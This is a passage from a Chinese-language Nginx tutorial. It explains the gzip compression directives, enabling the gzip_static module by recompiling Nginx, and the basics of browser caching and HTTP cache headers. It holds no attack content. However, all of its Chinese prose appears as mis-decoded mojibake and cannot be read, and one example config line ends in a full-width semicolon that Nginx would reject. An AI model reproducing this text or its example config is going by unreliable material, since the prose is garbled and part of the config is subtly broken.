8k;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>å…¶ä¸­number:æŒ‡å®šNginxæœåŠ¡å™¨å‘ç³»ç»Ÿç”³è¯·ç¼“å­˜ç©ºé—´ä¸ªæ•°ï¼ŒsizeæŒ‡çš„æ˜¯æ¯ä¸ªç¼“å­˜ç©ºé—´çš„å¤§å°ã€‚ä¸»è¦å®ç°çš„æ˜¯ç”³è¯·numberä¸ªæ¯ä¸ªå¤§å°ä¸ºsizeçš„å†…å­˜ç©ºé—´ã€‚è¿™ä¸ªå€¼çš„è®¾å®šä¸€èˆ¬ä¼šå’ŒæœåŠ¡å™¨çš„æ“ä½œç³»ç»Ÿæœ‰å…³ï¼Œæ‰€ä»¥å»ºè®®æ­¤é¡¹ä¸è®¾ç½®ï¼Œä½¿ç”¨é»˜è®¤å€¼å³å¯ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">gzip_buffers</span> <span class="hljs-number">4</span> <span class="hljs-number">16</span>K;  #ç¼“å­˜ç©ºé—´å¤§å°<br></code></pre></td></tr></table></figure><ol start="6"><li>gzip_disableæŒ‡ä»¤ï¼šé’ˆå¯¹ä¸åŒç§ç±»å®¢æˆ·ç«¯å‘èµ·çš„è¯·æ±‚ï¼Œå¯ä»¥é€‰æ‹©æ€§åœ°å¼€å¯å’Œå…³é—­GzipåŠŸèƒ½ã€‚</li></ol><table><thead><tr><th>è¯­æ³•</th><th>gzip_disable regex â€¦;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>regex:æ ¹æ®å®¢æˆ·ç«¯çš„æµè§ˆå™¨æ ‡å¿—(user-agent)æ¥è®¾ç½®ï¼Œæ”¯æŒä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ã€‚æŒ‡å®šçš„æµè§ˆå™¨æ ‡å¿—ä¸ä½¿ç”¨Gzip.è¯¥æŒ‡ä»¤ä¸€èˆ¬æ˜¯ç”¨æ¥æ’é™¤ä¸€äº›æ˜æ˜¾ä¸æ”¯æŒGzipçš„æµè§ˆå™¨ã€‚</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">gzip_disable <span class="hljs-string">&quot;MSIE [1-6]\.&quot;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><ol start="7"><li>gzip_http_versionæŒ‡ä»¤ï¼šé’ˆå¯¹ä¸åŒçš„HTTPåè®®ç‰ˆæœ¬ï¼Œå¯ä»¥é€‰æ‹©æ€§åœ°å¼€å¯å’Œå…³é—­GzipåŠŸèƒ½ã€‚</li></ol><table><thead><tr><th>è¯­æ³•</th><th>gzip_http_version 1.0|1.1;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>gzip_http_version 1.1;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>è¯¥æŒ‡ä»¤æ˜¯æŒ‡å®šä½¿ç”¨Gzipçš„HTTPæœ€ä½ç‰ˆæœ¬ï¼Œè¯¥æŒ‡ä»¤ä¸€èˆ¬é‡‡ç”¨é»˜è®¤å€¼å³å¯ã€‚</p><ol start="8"><li>gzip_min_lengthæŒ‡ä»¤ï¼šè¯¥æŒ‡ä»¤é’ˆå¯¹ä¼ è¾“æ•°æ®çš„å¤§å°ï¼Œå¯ä»¥é€‰æ‹©æ€§åœ°å¼€å¯å’Œå…³é—­GzipåŠŸèƒ½</li></ol><table><thead><tr><th>è¯­æ³•</th><th>gzip_min_length length;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>gzip_min_length 20;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">nignxè®¡é‡å¤§å°çš„å•ä½ï¼šbytes[å­—èŠ‚] <span class="hljs-regexp">/ kb[åƒå­—èŠ‚] /</span> M[å…†]<br>ä¾‹å¦‚: <span class="hljs-number">1024</span> <span class="hljs-regexp">/ 10k|K /</span> <span class="hljs-number">10</span>m|M<br></code></pre></td></tr></table></figure><p>Gzipå‹ç¼©åŠŸèƒ½å¯¹å¤§æ•°æ®çš„å‹ç¼©æ•ˆæœæ˜æ˜¾ï¼Œä½†æ˜¯å¦‚æœè¦å‹ç¼©çš„æ•°æ®æ¯”è¾ƒå°çš„åŒ–ï¼Œå¯èƒ½å‡ºç°è¶Šå‹ç¼©æ•°æ®é‡è¶Šå¤§çš„æƒ…å†µï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ ¹æ®å“åº”å†…å®¹çš„å¤§å°æ¥å†³å®šæ˜¯å¦ä½¿ç”¨GzipåŠŸèƒ½ï¼Œå“åº”é¡µé¢çš„å¤§å°å¯ä»¥é€šè¿‡å¤´ä¿¡æ¯ä¸­çš„<code>Content-Length</code>æ¥è·å–ã€‚ä½†æ˜¯å¦‚ä½•ä½¿ç”¨äº†Chunkç¼–ç åŠ¨æ€å‹ç¼©ï¼Œè¯¥æŒ‡ä»¤å°†è¢«å¿½ç•¥ã€‚å»ºè®®è®¾ç½®ä¸º1Kæˆ–ä»¥ä¸Šã€‚</p><ol start="9"><li>gzip_proxiedæŒ‡ä»¤ï¼šè¯¥æŒ‡ä»¤è®¾ç½®æ˜¯å¦å¯¹æœåŠ¡ç«¯è¿”å›çš„ç»“æœè¿›è¡ŒGzipå‹ç¼©ã€‚</li></ol><table><thead><tr><th>è¯­æ³•</th><th>gzip_proxied  off|expired|no-cache|<br/>no-store|private|no_last_modified|no_etag|auth|any;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>gzip_proxied off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>off - å…³é—­NginxæœåŠ¡å™¨å¯¹åå°æœåŠ¡å™¨è¿”å›ç»“æœçš„Gzipå‹ç¼©<br />expired - å¯ç”¨å‹ç¼©ï¼Œå¦‚æœheaderå¤´ä¸­åŒ…å« â€œExpiresâ€ å¤´ä¿¡æ¯<br />no-cache - å¯ç”¨å‹ç¼©ï¼Œå¦‚æœheaderå¤´ä¸­åŒ…å« â€œCache-Control:no-cacheâ€ å¤´ä¿¡æ¯<br />no-store - å¯ç”¨å‹ç¼©ï¼Œå¦‚æœheaderå¤´ä¸­åŒ…å« â€œCache-Control:no-storeâ€ å¤´ä¿¡æ¯<br />private - å¯ç”¨å‹ç¼©ï¼Œå¦‚æœheaderå¤´ä¸­åŒ…å« â€œCache-Control:privateâ€ å¤´ä¿¡æ¯<br />no_last_modified - å¯ç”¨å‹ç¼©,å¦‚æœheaderå¤´ä¸­ä¸åŒ…å« â€œLast-Modifiedâ€ å¤´ä¿¡æ¯<br />no_etag - å¯ç”¨å‹ç¼© ,å¦‚æœheaderå¤´ä¸­ä¸åŒ…å« â€œETagâ€ å¤´ä¿¡æ¯<br />auth - å¯ç”¨å‹ç¼© , å¦‚æœheaderå¤´ä¸­åŒ…å« â€œAuthorizationâ€ å¤´ä¿¡æ¯<br />any - æ— æ¡ä»¶å¯ç”¨å‹ç¼©</p><h4 id="gzipå‹ç¼©åŠŸèƒ½çš„å®ä¾‹é…ç½®"><a class="markdownIt-Anchor" href="#gzipå‹ç¼©åŠŸèƒ½çš„å®ä¾‹é…ç½®"></a> Gzipå‹ç¼©åŠŸèƒ½çš„å®ä¾‹é…ç½®</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;    <span class="hljs-comment">#å¼€å¯gzipåŠŸèƒ½</span><br><span class="hljs-attribute">gzip_types</span> *;  <span class="hljs-comment">#å‹ç¼©æºæ–‡ä»¶ç±»å‹,æ ¹æ®å…·ä½“çš„è®¿é—®èµ„æºç±»å‹è®¾å®š</span><br><span class="hljs-attribute">gzip_comp_level</span> <span class="hljs-number">6</span>;  <span class="hljs-comment">#gzipå‹ç¼©çº§åˆ«</span><br><span class="hljs-attribute">gzip_min_length</span> <span class="hljs-number">1024</span>; <span class="hljs-comment">#è¿›è¡Œå‹ç¼©å“åº”é¡µé¢çš„æœ€å°é•¿åº¦,content-length</span><br><span class="hljs-attribute">gzip_buffers</span> <span class="hljs-number">4</span> <span class="hljs-number">16K</span>;  <span class="hljs-comment">#ç¼“å­˜ç©ºé—´å¤§å°</span><br><span class="hljs-attribute">gzip_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>; <span class="hljs-comment">#æŒ‡å®šå‹ç¼©å“åº”æ‰€éœ€è¦çš„æœ€ä½HTTPè¯·æ±‚ç‰ˆæœ¬</span><br><span class="hljs-attribute">gzip_vary</span>  <span class="hljs-literal">on</span>;  <span class="hljs-comment">#å¾€å¤´ä¿¡æ¯ä¸­æ·»åŠ å‹ç¼©æ ‡è¯†</span><br><span class="hljs-attribute">gzip_disable</span> <span class="hljs-string">&quot;MSIE [1-6]\.&quot;</span>; <span class="hljs-comment">#å¯¹IE6ä»¥ä¸‹çš„ç‰ˆæœ¬éƒ½ä¸è¿›è¡Œå‹ç¼©</span><br><span class="hljs-attribute">gzip_proxied</span>  <span class="hljs-literal">off</span>ï¼› <span class="hljs-comment">#nginxä½œä¸ºåå‘ä»£ç†å‹ç¼©æœåŠ¡ç«¯è¿”å›æ•°æ®çš„æ¡ä»¶</span><br></code></pre></td></tr></table></figure><p>è¿™äº›é…ç½®åœ¨å¾ˆå¤šåœ°æ–¹å¯èƒ½éƒ½ä¼šç”¨åˆ°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†è¿™äº›å†…å®¹æŠ½å–åˆ°ä¸€ä¸ªé…ç½®æ–‡ä»¶ä¸­ï¼Œç„¶åé€šè¿‡includeæŒ‡ä»¤æŠŠé…ç½®æ–‡ä»¶å†æ¬¡åŠ è½½åˆ°nginx.confé…ç½®æ–‡ä»¶ä¸­ï¼Œæ–¹æ³•ä½¿ç”¨ã€‚</p><p>nginx_gzip.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">gzip_types</span> *;<br><span class="hljs-attribute">gzip_comp_level</span> <span class="hljs-number">6</span>;<br><span class="hljs-attribute">gzip_min_length</span> <span class="hljs-number">1024</span>;<br><span class="hljs-attribute">gzip_buffers</span> <span class="hljs-number">4</span> <span class="hljs-number">16K</span>;<br><span class="hljs-attribute">gzip_http_version</span> <span class="hljs-number">1</span>.<span class="hljs-number">1</span>;<br><span class="hljs-attribute">gzip_vary</span>  <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">gzip_disable</span> <span class="hljs-string">&quot;MSIE [1-6]\.&quot;</span>;<br><span class="hljs-attribute">gzip_proxied</span>  <span class="hljs-literal">off</span>;<br></code></pre></td></tr></table></figure><p>nginx.conf</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">include</span> nginx_gzip.<span class="hljs-keyword">conf</span><br></code></pre></td></tr></table></figure><h4 id="gzipå’Œsendfileå…±å­˜é—®é¢˜"><a class="markdownIt-Anchor" href="#gzipå’Œsendfileå…±å­˜é—®é¢˜"></a> Gzipå’Œsendfileå…±å­˜é—®é¢˜</h4><p>å‰é¢åœ¨è®²è§£sendfileçš„æ—¶å€™ï¼Œæåˆ°è¿‡ï¼Œå¼€å¯sendfileä»¥åï¼Œåœ¨è¯»å–ç£ç›˜ä¸Šçš„é™æ€èµ„æºæ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥å‡å°‘æ‹·è´çš„æ¬¡æ•°ï¼Œå¯ä»¥ä¸ç»è¿‡ç”¨æˆ·è¿›ç¨‹å°†é™æ€æ–‡ä»¶é€šè¿‡ç½‘ç»œè®¾å¤‡å‘é€å‡ºå»ï¼Œä½†æ˜¯Gzipè¦æƒ³å¯¹èµ„æºå‹ç¼©ï¼Œæ˜¯éœ€è¦ç»è¿‡ç”¨æˆ·è¿›ç¨‹è¿›è¡Œæ“ä½œçš„ã€‚æ‰€ä»¥å¦‚ä½•è§£å†³ä¸¤ä¸ªè®¾ç½®çš„å…±å­˜é—®é¢˜ã€‚</p><p>å¯ä»¥ä½¿ç”¨ngx_http_gzip_static_moduleæ¨¡å—çš„gzip_staticæŒ‡ä»¤æ¥è§£å†³ã€‚</p><h5 id="gzip_staticæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#gzip_staticæŒ‡ä»¤"></a> gzip_staticæŒ‡ä»¤</h5><p>gzip_static: æ£€æŸ¥ä¸è®¿é—®èµ„æºåŒåçš„.gzæ–‡ä»¶æ—¶ï¼Œresponseä¸­ä»¥gzipç›¸å…³çš„headerè¿”å›.gzæ–‡ä»¶çš„å†…å®¹ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th><strong>gzip_static</strong> on | off | always;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>gzip_static off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>æ·»åŠ ä¸Šè¿°å‘½ä»¤åï¼Œä¼šæŠ¥ä¸€ä¸ªé”™è¯¯ï¼Œ<code>unknown directive &quot;gzip_static&quot;</code>ä¸»è¦çš„åŸå› æ˜¯Nginxé»˜è®¤æ˜¯æ²¡æœ‰æ·»åŠ ngx_http_gzip_static_moduleæ¨¡å—ã€‚å¦‚ä½•æ¥æ·»åŠ ?</p><h5 id="æ·»åŠ æ¨¡å—åˆ°nginxçš„å®ç°æ­¥éª¤"><a class="markdownIt-Anchor" href="#æ·»åŠ æ¨¡å—åˆ°nginxçš„å®ç°æ­¥éª¤"></a> æ·»åŠ æ¨¡å—åˆ°Nginxçš„å®ç°æ­¥éª¤</h5><p>(1)æŸ¥è¯¢å½“å‰Nginxçš„é…ç½®å‚æ•°</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx -V</span><br></code></pre></td></tr></table></figure><p>(2)å°†nginxå®‰è£…ç›®å½•ä¸‹sbinç›®å½•ä¸­çš„nginxäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œæ›´å</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<br>mv nginx nginxold<br></code></pre></td></tr></table></figure><p>(3) è¿›å…¥Nginxçš„å®‰è£…ç›®å½•</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/root/</span>nginx<span class="hljs-regexp">/core/</span>nginx-<span class="hljs-number">1.16</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>(4)æ‰§è¡Œmake cleanæ¸…ç©ºä¹‹å‰ç¼–è¯‘çš„å†…å®¹</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make clean</span><br></code></pre></td></tr></table></figure><p>(5)ä½¿ç”¨configureæ¥é…ç½®å‚æ•°</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./configure</span> <span class="hljs-params">--with-http_gzip_static_module</span><br></code></pre></td></tr></table></figure><p>(6)ä½¿ç”¨makeå‘½ä»¤è¿›è¡Œç¼–è¯‘</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure><p>(7) å°†objsç›®å½•ä¸‹çš„nginxäºŒè¿›åˆ¶æ‰§è¡Œæ–‡ä»¶ç§»åŠ¨åˆ°nginxå®‰è£…ç›®å½•ä¸‹çš„sbinç›®å½•ä¸­</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mv objs<span class="hljs-regexp">/nginx /u</span>sr<span class="hljs-regexp">/local/</span>nginx/sbin<br></code></pre></td></tr></table></figure><p>(8)æ‰§è¡Œæ›´æ–°å‘½ä»¤</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make upgrade</span><br></code></pre></td></tr></table></figure><h5 id="gzip_staticæµ‹è¯•ä½¿ç”¨"><a class="markdownIt-Anchor" href="#gzip_staticæµ‹è¯•ä½¿ç”¨"></a> gzip_staticæµ‹è¯•ä½¿ç”¨</h5><p>(1)ç›´æ¥è®¿é—®<code>http://192.168.200.133/jquery.js</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587932106429.png" alt="1587932106429" /></p><p>(2)ä½¿ç”¨gzipå‘½ä»¤è¿›è¡Œå‹ç¼©</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>html<br>gzip jquery.js<br></code></pre></td></tr></table></figure><p>(3)å†æ¬¡è®¿é—®<code>http://192.168.200.133/jquery.js</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1587932300006.png" alt="1587932300006" /></p><h3 id="é™æ€èµ„æºçš„ç¼“å­˜å¤„ç†"><a class="markdownIt-Anchor" href="#é™æ€èµ„æºçš„ç¼“å­˜å¤„ç†"></a> é™æ€èµ„æºçš„ç¼“å­˜å¤„ç†</h3><h4 id="ä»€ä¹ˆæ˜¯ç¼“å­˜"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯ç¼“å­˜"></a> ä»€ä¹ˆæ˜¯ç¼“å­˜</h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">ç¼“å­˜ï¼ˆ<span class="hljs-keyword">cache</span>ï¼‰ï¼ŒåŸå§‹æ„ä¹‰æ˜¯æŒ‡è®¿é—®é€Ÿåº¦æ¯”ä¸€èˆ¬éšæœºå­˜å–å­˜å‚¨å™¨ï¼ˆRAMï¼‰å¿«çš„ä¸€ç§é«˜é€Ÿå­˜å‚¨å™¨ï¼Œé€šå¸¸å®ƒä¸åƒç³»ç»Ÿä¸»å­˜é‚£æ ·ä½¿ç”¨DRAMæŠ€æœ¯ï¼Œè€Œä½¿ç”¨æ˜‚è´µä½†è¾ƒå¿«é€Ÿçš„SRAMæŠ€æœ¯ã€‚ç¼“å­˜çš„è®¾ç½®æ˜¯æ‰€æœ‰ç°ä»£è®¡ç®—æœºç³»ç»Ÿå‘æŒ¥é«˜æ€§èƒ½çš„é‡è¦å› ç´ ä¹‹ä¸€ã€‚<br></code></pre></td></tr></table></figure><h4 id="ä»€ä¹ˆæ˜¯webç¼“å­˜"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯webç¼“å­˜"></a> ä»€ä¹ˆæ˜¯webç¼“å­˜</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Webç¼“å­˜æ˜¯æŒ‡ä¸€ä¸ªWebèµ„æºï¼ˆå¦‚htmlé¡µé¢ï¼Œå›¾ç‰‡ï¼Œjsï¼Œæ•°æ®ç­‰ï¼‰å­˜åœ¨äºWebæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ï¼ˆæµè§ˆå™¨ï¼‰ä¹‹é—´çš„å‰¯æœ¬ã€‚ç¼“å­˜ä¼šæ ¹æ®è¿›æ¥çš„è¯·æ±‚ä¿å­˜è¾“å‡ºå†…å®¹çš„å‰¯æœ¬ï¼›å½“ä¸‹ä¸€ä¸ªè¯·æ±‚æ¥åˆ°çš„æ—¶å€™ï¼Œå¦‚æœæ˜¯ç›¸åŒçš„<span class="hljs-built_in">URL</span>ï¼Œç¼“å­˜ä¼šæ ¹æ®ç¼“å­˜æœºåˆ¶å†³å®šæ˜¯ç›´æ¥ä½¿ç”¨å‰¯æœ¬å“åº”è®¿é—®è¯·æ±‚ï¼Œè¿˜æ˜¯å‘æºæœåŠ¡å™¨å†æ¬¡å‘é€è¯·æ±‚ã€‚æ¯”è¾ƒå¸¸è§çš„å°±æ˜¯æµè§ˆå™¨ä¼šç¼“å­˜è®¿é—®è¿‡ç½‘ç«™çš„ç½‘é¡µï¼Œå½“å†æ¬¡è®¿é—®è¿™ä¸ª<span class="hljs-built_in">URL</span>åœ°å€çš„æ—¶å€™ï¼Œå¦‚æœç½‘é¡µæ²¡æœ‰æ›´æ–°ï¼Œå°±ä¸ä¼šå†æ¬¡ä¸‹è½½ç½‘é¡µï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜çš„ç½‘é¡µã€‚åªæœ‰å½“ç½‘ç«™æ˜ç¡®æ ‡è¯†èµ„æºå·²ç»æ›´æ–°ï¼Œæµè§ˆå™¨æ‰ä¼šå†æ¬¡ä¸‹è½½ç½‘é¡µ<br></code></pre></td></tr></table></figure><h4 id="webç¼“å­˜çš„ç§ç±»"><a class="markdownIt-Anchor" href="#webç¼“å­˜çš„ç§ç±»"></a> webç¼“å­˜çš„ç§ç±»</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">å®¢æˆ·ç«¯ç¼“å­˜<br>æµè§ˆå™¨ç¼“å­˜<br>æœåŠ¡ç«¯ç¼“å­˜<br>Nginx <span class="hljs-regexp">/ Redis /</span> Memcachedç­‰<br></code></pre></td></tr></table></figure><h4 id="æµè§ˆå™¨ç¼“å­˜"><a class="markdownIt-Anchor" href="#æµè§ˆå™¨ç¼“å­˜"></a> æµè§ˆå™¨ç¼“å­˜</h4><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">æ˜¯ä¸ºäº†èŠ‚çº¦ç½‘ç»œçš„èµ„æºåŠ é€Ÿæµè§ˆï¼Œæµè§ˆå™¨åœ¨ç”¨æˆ·ç£ç›˜ä¸Šå¯¹æœ€è¿‘è¯·æ±‚è¿‡çš„æ–‡æ¡£è¿›è¡Œå­˜å‚¨ï¼Œå½“è®¿é—®è€…å†æ¬¡è¯·æ±‚è¿™ä¸ªé¡µé¢æ—¶ï¼Œæµè§ˆå™¨å°±å¯ä»¥ä»æœ¬åœ°ç£ç›˜æ˜¾ç¤ºæ–‡æ¡£ï¼Œè¿™æ ·å°±å¯ä»¥åŠ é€Ÿé¡µé¢çš„é˜…è§ˆ.<br></code></pre></td></tr></table></figure><h4 id="ä¸ºä»€ä¹ˆè¦ç”¨æµè§ˆå™¨ç¼“å­˜"><a class="markdownIt-Anchor" href="#ä¸ºä»€ä¹ˆè¦ç”¨æµè§ˆå™¨ç¼“å­˜"></a> ä¸ºä»€ä¹ˆè¦ç”¨æµè§ˆå™¨ç¼“å­˜</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">æˆæœ¬æœ€ä½çš„ä¸€ç§ç¼“å­˜å®ç°<br>å‡å°‘ç½‘ç»œå¸¦å®½æ¶ˆè€—<br>é™ä½æœåŠ¡å™¨å‹åŠ›<br>å‡å°‘ç½‘ç»œå»¶è¿Ÿï¼ŒåŠ å¿«é¡µé¢æ‰“å¼€é€Ÿåº¦<br></code></pre></td></tr></table></figure><h4 id="æµè§ˆå™¨ç¼“å­˜çš„æ‰§è¡Œæµç¨‹"><a class="markdownIt-Anchor" href="#æµè§ˆå™¨ç¼“å­˜çš„æ‰§è¡Œæµç¨‹"></a> æµè§ˆå™¨ç¼“å­˜çš„æ‰§è¡Œæµç¨‹</h4><p>HTTPåè®®ä¸­å’Œé¡µé¢ç¼“å­˜ç›¸å…³çš„å­—æ®µï¼Œæˆ‘ä»¬å…ˆæ¥è®¤è¯†ä¸‹ï¼š</p><table><thead><tr><th>header</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>Expires</td><td>ç¼“å­˜è¿‡æœŸçš„æ—¥æœŸå’Œæ—¶é—´</td></tr><tr><td>Cache-Control</td><td>è®¾ç½®å’Œç¼“å­˜ç›¸å…³çš„é…ç½®ä¿¡æ¯</td></tr><tr><td>Last-Modified</td><td>è¯·æ±‚èµ„æºæœ€åä¿®æ”¹æ—¶é—´</td></tr><tr><td>ETag</td><td>è¯·æ±‚å˜é‡çš„å®ä½“æ ‡ç­¾çš„å½“å‰å€¼ï¼Œæ¯”å¦‚æ–‡ä»¶çš„MD5å€¼</td></tr></tbody></table><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581762832290.png" alt="" /></p><p>ï¼ˆ1ï¼‰ç”¨æˆ·é¦–æ¬¡é€šè¿‡æµè§ˆå™¨å‘é€è¯·æ±‚åˆ°æœåŠ¡ç«¯è·å–æ•°æ®ï¼Œå®¢æˆ·ç«¯æ˜¯æ²¡æœ‰å¯¹åº”çš„ç¼“å­˜ï¼Œæ‰€ä»¥éœ€è¦å‘é€requestè¯·æ±‚æ¥è·å–æ•°æ®ï¼›</p><p>ï¼ˆ2ï¼‰æœåŠ¡ç«¯æ¥æ”¶åˆ°è¯·æ±‚åï¼Œè·å–æœåŠ¡ç«¯çš„æ•°æ®åŠæœåŠ¡ç«¯ç¼“å­˜çš„å…è®¸åï¼Œè¿”å›200çš„æˆåŠŸçŠ¶æ€ç å¹¶ä¸”åœ¨å“åº”å¤´ä¸Šé™„ä¸Šå¯¹åº”èµ„æºä»¥åŠç¼“å­˜ä¿¡æ¯ï¼›</p><p>ï¼ˆ3ï¼‰å½“ç”¨æˆ·å†æ¬¡è®¿é—®ç›¸åŒèµ„æºçš„æ—¶å€™ï¼Œå®¢æˆ·ç«¯ä¼šåœ¨æµè§ˆå™¨çš„ç¼“å­˜ç›®å½•ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨å“åº”çš„ç¼“å­˜æ–‡ä»¶</p><p>ï¼ˆ4ï¼‰å¦‚æœæ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„ç¼“å­˜æ–‡ä»¶ï¼Œåˆ™èµ°(2)æ­¥</p><p>ï¼ˆ5ï¼‰å¦‚æœæœ‰ç¼“å­˜æ–‡ä»¶ï¼Œæ¥ä¸‹æ¥å¯¹ç¼“å­˜æ–‡ä»¶æ˜¯å¦è¿‡æœŸè¿›è¡Œåˆ¤æ–­ï¼Œè¿‡æœŸçš„åˆ¤æ–­æ ‡å‡†æ˜¯(Expires),</p><p>ï¼ˆ6ï¼‰å¦‚æœæ²¡æœ‰è¿‡æœŸï¼Œåˆ™ç›´æ¥ä»æœ¬åœ°ç¼“å­˜ä¸­è¿”å›æ•°æ®è¿›è¡Œå±•ç¤º</p><p>ï¼ˆ7ï¼‰å¦‚æœExpiresè¿‡æœŸï¼Œæ¥ä¸‹æ¥éœ€è¦åˆ¤æ–­ç¼“å­˜æ–‡ä»¶æ˜¯å¦å‘ç”Ÿè¿‡å˜åŒ–</p><p>ï¼ˆ8ï¼‰åˆ¤æ–­çš„æ ‡å‡†æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯ETag(Entity Tag),ä¸€ä¸ªæ˜¯Last-Modified</p><p>ï¼ˆ9ï¼‰åˆ¤æ–­ç»“æœæ˜¯æœªå‘ç”Ÿå˜åŒ–ï¼Œåˆ™æœåŠ¡ç«¯è¿”å›304ï¼Œç›´æ¥ä»ç¼“å­˜æ–‡ä»¶ä¸­è·å–æ•°æ®</p><p>ï¼ˆ10ï¼‰å¦‚æœåˆ¤æ–­æ˜¯å‘ç”Ÿäº†å˜åŒ–ï¼Œé‡æ–°ä»æœåŠ¡ç«¯è·å–æ•°æ®ï¼Œå¹¶æ ¹æ®ç¼“å­˜åå•†(æœåŠ¡ç«¯æ‰€è®¾ç½®çš„æ˜¯å¦éœ€è¦è¿›è¡Œç¼“å­˜æ•°æ®çš„è®¾ç½®)æ¥è¿›è¡Œæ•°æ®ç¼“å­˜ã€‚</p><h4 id="æµè§ˆå™¨ç¼“å­˜ç›¸å…³æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#æµè§ˆå™¨ç¼“å­˜ç›¸å…³æŒ‡ä»¤"></a> 